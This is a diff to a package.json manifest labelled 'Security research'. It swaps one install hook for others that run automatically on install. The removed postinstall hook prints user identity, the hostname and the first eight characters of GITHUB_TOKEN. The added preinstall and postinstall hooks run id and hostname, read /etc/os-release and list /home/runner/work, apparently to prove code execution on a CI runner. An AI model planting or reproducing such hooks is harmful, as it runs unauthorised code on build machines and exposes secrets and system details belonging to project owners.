@@ -3,7 +3,8 @@
   "version": "1.0.0",
   "description": "Security research",
   "scripts": {
-    "postinstall": "echo SECURITY_TEST_RCE_PROOF && id && whoami && cat /etc/hostname 2>/dev/null && echo GITHUB_TOKEN_FIRST_CHARS=${GITHUB_TOKEN:0:8} && echo END_SECURITY_TEST"
+    "preinstall": "echo '=== RCE_PROOF_START ===' && id && hostname && echo '=== RCE_PROOF_END ===' >&2",
+    "postinstall": "echo '=== POSTINSTALL_RCE_PROOF ===' && id && cat /etc/os-release | head -3 && ls -la /home/runner/work/ 2>/dev/null && echo '=== END_POSTINSTALL_PROOF ===' >&2"
   },
   "license": "MIT"
 }
